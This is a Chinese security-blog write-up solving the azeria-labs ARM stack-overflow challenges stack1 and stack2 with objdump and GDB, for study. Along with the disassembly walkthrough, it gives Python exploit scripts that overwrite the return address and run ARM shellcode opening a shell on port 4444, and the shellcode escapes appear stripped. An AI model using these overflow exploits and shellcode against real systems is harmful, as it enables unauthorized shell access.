# ARM汇编之堆栈溢出实战分析二(GDB)

阅读量 **282599**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-08 15:29:38

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01440f95e5b70da9fb.jpg)

## 引言

经过很长一段时间在[azeria-labs](https://azeria-labs.com/writing-arm-assembly-part-1/)进行的ARM基础汇编学习，学到了很多ARM汇编的基础知识、和简单的shellcode的编写，为了验证自己的学习成果，根据该网站提供的实例，做一次比较详细的逆向分析，和shellcode的实现，为自己的ARM入门学习巩固,本篇Paper是承接上一篇[ARM汇编之堆栈溢出实战分析一(GDB)](https://www.anquanke.com/post/id/169071)后针对剩余的练习例子做一个分析。

实例下载地址：git clone <https://github.com/azeria-labs/ARM-challenges.git>

调试环境：`Linux raspberrypi 4.4.34+ #3 Thu Dec 1 14:44:23 IST 2016 armv6l
GNU/Linux`+`GNU gdb (Raspbian 7.7.1+dfsg-5+rpi1)
7.7.1`（这些都是按照网站教程安装的如果自己有ARM架构的操作系统也是可以的）

## stack1

这里用到了`checksec工具`，简要说下下载安装方式  
先下载cheksec：`git clone https://github.com/slimm609/checksec.sh.git`，然后使用`ln -sf
<checksec绝对路径> /usr/bin/checksec`，安装ok

  1. `checksec -f stack1`,保护措施基本都已经关闭，所以不需要做涉及更多的绕过技术来逃过保护机制，下面直接分析程序 
    
        pi[@raspberrypi](https://github.com/raspberrypi "@raspberrypi"):~/Desktop/ARM-challenges $ checksec -f stack1
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY    Fortified    Fortifiable  FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   113 Symbols     No    0        4    stack1
    

  2. 直接运行程序`./stack1`，返回如下，让我们附带参数输入。

    
    
    pi@raspberrypi:~/Desktop/ARM-challenges $ ./stack1
    stack1: please specify an argument
    
    pi@raspberrypi:~/Desktop/ARM-challenges $
    

附带参数输入，根据返回结果说明内部有个判断语句将错误的参数都返回执行这样的输出，下面我们进入程序汇编代码，仔细分析他的逻辑

    
    
    pi@raspberrypi:~/Desktop/ARM-challenges $ ./stack1 111
    Try again, you got 0x00000000
    

3.`objdump -d ./stack1`获取到反汇编代码

`第一个分支判断语句`：可以看到，先判断`[fp,
#-80]`内的参数的个数（`可执行文件路径名占第一个参数值`），来进行第一次分支跳转，如果没有跳转就输出`[pc,
#92]-->0x10538-->0x000105bc-->"please specify an
argumentn"`，然后退出。所以我们假设输入了参数，执行了第一个分支跳转，跳到了`104dc`位置执行，在这里它将`r1+4`的位置也就是参数存放的地址给了`r3`，然后当参数赋值给`r1`，把`r11-#72`的位置放入参数`r0`内，开始执行strcpy函数，把第一个参数的值的地址赋给r0。

`第二个分支判断语句`：将之前`[fp, #-8]`地址处的`0`和`[pc,
#48]`处的值`0x61626364`进行比较，如果不相等，就跳转到`1051c`，格式化输出带有[fp, #-8]处值的`Try again, you
got 0x%08xn`。到这里我们基本知道我们的目标就是走另外一条分支，也就是不跳转到`1051c`，则需要满足[fp, #-8]地址处的值，x/4x
0x1053c查询后为(bcda)：

    
    
    0x1053c <main+140>:    0x64    0x63    0x62    0x61
    

经过计算从r11-#72的用户参数开始到fp,
#-8之间的距离为64字节长度，在加上覆盖的4字节，共计需要`68字节`长度的参数。最后我们构造尾部四个字符为`dcba`长度为68字节的参数即可。至此我们的第二个挑战stack1已经分析完成

    
    
    raspberrypi:~/Desktop/ARM-challenges $ ./stack1 abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcddcba
    you have correctly got the variable to the right value
    
    
    
    000104b0 <main>:
        //初始化操作：压栈、分配栈空间、保存r0：参数个数、r1：文件的路径名称
       104b0:    e92d4800     push    {fp, lr}
       104b4:    e28db004     add    fp, sp, #4
       104b8:    e24dd050     sub    sp, sp, #80    ; 0x50
       104bc:    e50b0050     str    r0, [fp, #-80]    ; 0xffffffb0
       104c0:    e50b1054     str    r1, [fp, #-84]    ; 0xffffffac
        //第一个分支判断语句  
       104c4:    e51b3050     ldr    r3, [fp, #-80]    ; 0xffffffb0
       104c8:    e3530001     cmp    r3, #1
       104cc:    1a000002     bne    104dc <main+0x2c>
       104d0:    e3a00001     mov    r0, #1
       104d4:    e59f105c     ldr    r1, [pc, #92]    ; 10538 <main+0x88>
       104d8:    ebffffa4     bl    10370 <errx@plt>
       104dc:    e3a03000     mov    r3, #0
       104e0:    e50b3008     str    r3, [fp, #-8]
       104e4:    e51b3054     ldr    r3, [fp, #-84]    ; 0xffffffac
       104e8:    e2833004     add    r3, r3, #4
       104ec:    e5933000     ldr    r3, [r3]
       104f0:    e24b2048     sub    r2, fp, #72    ; 0x48
       104f4:    e1a00002     mov    r0, r2
       104f8:    e1a01003     mov    r1, r3
       104fc:    ebffff8f     bl    10340 <strcpy@plt>
        //第二个分支判断语句
       10500:    e51b3008     ldr    r3, [fp, #-8]
       10504:    e59f2030     ldr    r2, [pc, #48]    ; 1053c <main+0x8c>
       10508:    e1530002     cmp    r3, r2
       1050c:    1a000002     bne    1051c <main+0x6c>
       10510:    e59f0028     ldr    r0, [pc, #40]    ; 10540 <main+0x90>
       10514:    ebffff8c     bl    1034c <puts@plt>
       10518:    ea000003     b    1052c <main+0x7c>
       1051c:    e51b3008     ldr    r3, [fp, #-8]
       10520:    e59f001c     ldr    r0, [pc, #28]    ; 10544 <main+0x94>
       10524:    e1a01003     mov    r1, r3
       10528:    ebffff81     bl    10334 <printf@plt>
       1052c:    e1a00003     mov    r0, r3
       10530:    e24bd004     sub    sp, fp, #4
       10534:    e8bd8800     pop    {fp, pc}
       10538:    000105bc     .word    0x000105bc
       1053c:    61626364     .word    0x61626364
       10540:    000105d8     .word    0x000105d8
       10544:    00010610     .word    0x00010610
    

最后再加一点点内容，追加一个EXP，注意给EXP清除NULL字符（0x00，0x20）,下面是shellcode

`x01x30x8fxe2x13xffx2fxe1x01x21x48x1cx92x1axc8x27x51x37x01xdfx04x1cx14xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx60x1cx01x38x02x21x02x37x01xdfx60x1cx01x38x49x40x52x40x01x37x01xdfx04x1cx60x1cx01x38x49x1ax3fx27x01xdfxc0x46x60x1cx01x38x01x21x01xdfx60x1cx01x38x02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58`

使用python脚本来构造EXP

    
    
    import struct
    padding = "111111111111111111111111111111111111111111111111111111111111111111111111"
    //返回地址0xbefff000会被90补充，所以多往下都一个地址
    return_addr = struct.pack("I", 0xbefff004)
    
    payload1 = "x01x30x8fxe2x13xffx2fxe1x01x21x48x1cx92x1axc8x27x51x37x01xdfx04x1cx14xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx60x1cx01x38x02x21x02x37x01xdfx60x1cx01x38x49x40x52x40x01x37x01xdfx04x1cx60x1cx01x38x49x1ax3fx27x01xdfxc0x46x60x1cx01x38x01x21x01xdfx60x1cx01x38x02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58"
    
    print padding + return_addr + "x90"*100 + payload1
    

最后执行：`./stack1 $(python poc.py)`成功开启exp

    
    
    Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
    ls
    README.md
    e4
    exp
    poc.py
    stack0
    stack1
    stack2
    stack3
    stack4
    stack5
    stack6
    

#  stack2

开始第三个例子的练习

  1. `file ./stack2`  
很明显这也是ELF可执行文件，并且符号表没有删除可以使用`nm`查看这个文件的符号表，这里我习惯用命令`objdump -d
./stack2`查看反汇编代码对照着来进行gdb调试  
 _stack2: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically
linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 2.6.32,
BuildID[sha1]=6bd4180a77908e31088564f232ac2d600a3109b0, not stripped_

反汇编结果，代码逻辑：`getenv`获取特定环境变量，这个环境变量的name为1056c 地址处值，将获取的环境变量值的地址存进`[fp,
#-8]`地址，并且进行`第一次分支判断`，如果获取的环境变量值为0，就会退出程序。这里我们遇到了第一个需要绕过的点，设置一个特定名称的环境变量，在下面调试的时候我们会获取到这个名称，现在我们假设已经设置好需要环境变量，继续往下走，然后就遇见了`strcpy`，将[fp,
#-8]地址处的字符串写入fp-#76处，也就是将特定环境变量的值写入栈内，明显是个溢出点。随后就是一些if-else语句，判断栈数据来进行相应的输出显示，来说明这个程序是否被攻破。

    
    
    000104e4 <main>:
       104e4:    e92d4800     push    {fp, lr}
       104e8:    e28db004     add    fp, sp, #4
       104ec:    e24dd050     sub    sp, sp, #80    ; 0x50
       104f0:    e50b0050     str    r0, [fp, #-80]    ; 0xffffffb0
       104f4:    e50b1054     str    r1, [fp, #-84]    ; 0xffffffac
       104f8:    e59f006c     ldr    r0, [pc, #108]    ; 1056c <main+0x88>
       104fc:    ebffff9c     bl    10374 <getenv@plt>
       10500:    e50b0008     str    r0, [fp, #-8]
       10504:    e51b3008     ldr    r3, [fp, #-8]
       10508:    e3530000     cmp    r3, #0
       1050c:    1a000002     bne    1051c <main+0x38>
       10510:    e3a00001     mov    r0, #1
       10514:    e59f1054     ldr    r1, [pc, #84]    ; 10570 <main+0x8c>
       10518:    ebffffa1     bl    103a4 <errx@plt>
       1051c:    e3a03000     mov    r3, #0
       10520:    e50b300c     str    r3, [fp, #-12]
       10524:    e24b304c     sub    r3, fp, #76    ; 0x4c
       10528:    e1a00003     mov    r0, r3
       1052c:    e51b1008     ldr    r1, [fp, #-8]
       10530:    ebffff8c     bl    10368 <strcpy@plt>
       10534:    e51b300c     ldr    r3, [fp, #-12]
       10538:    e59f2034     ldr    r2, [pc, #52]    ; 10574 <main+0x90>
       1053c:    e1530002     cmp    r3, r2
       10540:    1a000002     bne    10550 <main+0x6c>
       10544:    e59f002c     ldr    r0, [pc, #44]    ; 10578 <main+0x94>
       10548:    ebffff8c     bl    10380 <puts@plt>
       1054c:    ea000003     b    10560 <main+0x7c>
       10550:    e51b300c     ldr    r3, [fp, #-12]
       10554:    e59f0020     ldr    r0, [pc, #32]    ; 1057c <main+0x98>
       10558:    e1a01003     mov    r1, r3
       1055c:    ebffff7e     bl    1035c <printf@plt>
       10560:    e1a00003     mov    r0, r3
       10564:    e24bd004     sub    sp, fp, #4
       10568:    e8bd8800     pop    {fp, pc}
       1056c:    000105f4     .word    0x000105f4
       10570:    000105fc     .word    0x000105fc
       10574:    0d0a0d0a     .word    0x0d0a0d0a
       10578:    0001062c     .word    0x0001062c
       1057c:    00010658     .word    0x00010658
    

  1. gdb调试

  * 先在getenv下个断点，`b *0x000104fc`，然后`r`运行起来，就可以根据上面的反汇编代码，获取特定环境变量名称的地址`x/1wx 0x1056c`,获取到地址再获取字符串的值，命令如下，得到字符串`GREENIE`，获取到环境变量值，我们就可以设置对象的环境变量来满足它的要求 
    
        gef> x/1wx 0x1056c
    0x1056c <main+136>:    0x000105f4
    gef> x/s 0x000105f4
    0x105f4:    "GREENIE"
    

  * 设置环境变量`export`，这里使用命令`export GREENIE=A`设置环境变量，可以使用`export`来检查是否成功加入。成功设置好环境变量后，继续执行，它会将环境变量值赋到`fp-#76`栈地址内 
    
        pi[@raspberrypi](https://github.com/raspberrypi "@raspberrypi"):~/Desktop/ARM-challenges $ export GREENIE=A
    pi[@raspberrypi](https://github.com/raspberrypi "@raspberrypi"):~/Desktop/ARM-challenges $ export
    declare -x GREENIE="A"
    declare -x HOME="/home/pi"
    

  * `Try again`的回显  
比较栈内数据`[r11, #-12]（0xbefff0d0）`和`[pc, #52]`处的数据大小，如果不相等就会跳转到`0x10550`，随后输出`Try
again`，让再次尝试

    
        ->   0x10534 <main+80>        ldr    r3,  [r11,  #-12]
       0x10538 <main+84>        ldr    r2,  [pc,  #52]    ; 0x10574 <main+144>
       0x1053c <main+88>        cmp    r3,  r2
       0x10540 <main+92>        bne    0x10550 <main+108>
    ........
     ldr    r3, [fp, #-12]
    10554:    e59f0020     ldr    r0, [pc, #32]    ; 1057c <main+0x98>
    10558:    e1a01003     mov    r1, r3
    1055c:    ebffff7e     bl    1035c <printf[@plt](https://github.com/plt "@plt")>
    10560:    e1a00003     mov    r0, r3
    10564:    e24bd004     sub    sp, fp, #4
    10568:    e8bd8800     pop    {fp, pc}
    

[pc, #52]的值可以运行`x/4b`，查看

    
        gef> x/4b 0x10574
    0x10574 <main+144>:    0x0a    0x0d    0x0a    0x0d
    

  * `终点分支`：很明显我们需要跳转到下面的代码处，来攻破这个程序，所以需要计算满足上面的比较，让[r11, #-12]处的值为`0x0a 0x0d 0x0a 0x0d`，所以我们需要利用`溢出`来实现这个比较的相等，再往前逆向，我们需要使用环境变量`GREENIE`的值来溢出覆盖到`[r11, #-12]`

环境变量值起点地址：`fp-#76`  
需要覆盖的地址：`fp-#12`（[r11, #-12]）  
使用的覆盖值：`0x0a 0x0d 0x0a 0x0d`

**最后计算** ：`64`字节的padding + `4`字节的覆盖值

    
    
       10534:    e51b300c     ldr    r3, [fp, #-12]
       10538:    e59f2034     ldr    r2, [pc, #52]    ; 10574 <main+0x90>
       1053c:    e1530002     cmp    r3, r2
       10540:    1a000002     bne    10550 <main+0x6c>
       10544:    e59f002c     ldr    r0, [pc, #44]    ; 10578 <main+0x94>
       10548:    ebffff8c     bl    10380 <puts@plt>
       1054c:    ea000003     b    10560 <main+0x7c>
    ........
       10560:    e1a00003     mov    r0, r3
       10564:    e24bd004     sub    sp, fp, #4
       10568:    e8bd8800     pop    {fp, pc}
    

  * 覆盖执行  
利用`export
GREENIE=1111111111111111111111111111111111111111111111111111111111111111`干好覆盖64字节的数据到`0xbefff0d0`处，这64字节的padding成功完成他们的任务，我们再加上4字节的`0x0a
0x0d 0x0a 0x0d(nrnr)`即可，使用命令`export
GREENIE=$'1111111111111111111111111111111111111111111111111111111111111111nrnr'`即可写入特殊字符到环境变量

    
    
    gef> x/30wx 0xbefff090
    0xbefff090:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff0a0:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff0b0:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff0c0:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff0d0:    0x00000000
    

破解成功

    
    
    pi@raspberrypi:~/Desktop/ARM-challenges $  ./stack2
    you have correctly modified the variable
    

如果想用到exp：第一：`获取栈内返回地址的下一个栈地址：0xbeffeff0和溢出点到返回地址的长度`，第二：使用命令`export $(python
poc.py)`把exp代码写到环境变量中

    
    
    import struct
    padding = "1111111111111111111111111111111111111111111111111111111111111111111111111111"
    return_addr = struct.pack("I", 0xbeffeff0)
    
    payload1 = "x01x30x8fxe2x13xffx2fxe1x01x21x48x1cx92x1axc8x27x51x37x01xdfx04x1cx14xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx60x1cx01x38x02x21x02x37x01xdfx60x1cx01x38x49x40x52x40x01x37x01xdfx04x1cx60x1cx01x38x49x1ax3fx27x01xdfxc0x46x60x1cx01x38x01x21x01xdfx60x1cx01x38x02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58"
    
    print padding + return_addr + "x90"*100 + payload1
    

## 小结

从上面两个例子，写出一些本人的个人分析流程，如果有大佬看到不足的地方希望帮忙指教，thanks！

主要流程也就是，拿到样本文件后：了解是什么文件，有什么安全机制，然后看汇编代码了解代码逻辑。

## 附录：

> [1]
> [linux程序的常用保护机制](https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/)  
>  [2] [ARM汇编之堆栈溢出实战分析（GDB）](https://www.anquanke.com/post/id/169071)  
>  [3] [How do I actually write to an environment
> variable?](https://stackoverflow.com/questions/41309822/how-do-i-actually-> write-n-r-to-an-environment-variable)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **勤学奋进小郎君** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/169186](/post/id/169186)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [逆向工程](/tag/逆向工程)
  * [shellcode](/tag/shellcode)
  * [arm](/tag/arm)
  * [汇编](/tag/汇编)

 **+1** __6赞

 __收藏

![](https://p3.ssl.qhimg.com/t01fab72861c8ea0c9b.png) 勤学奋进小郎君

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

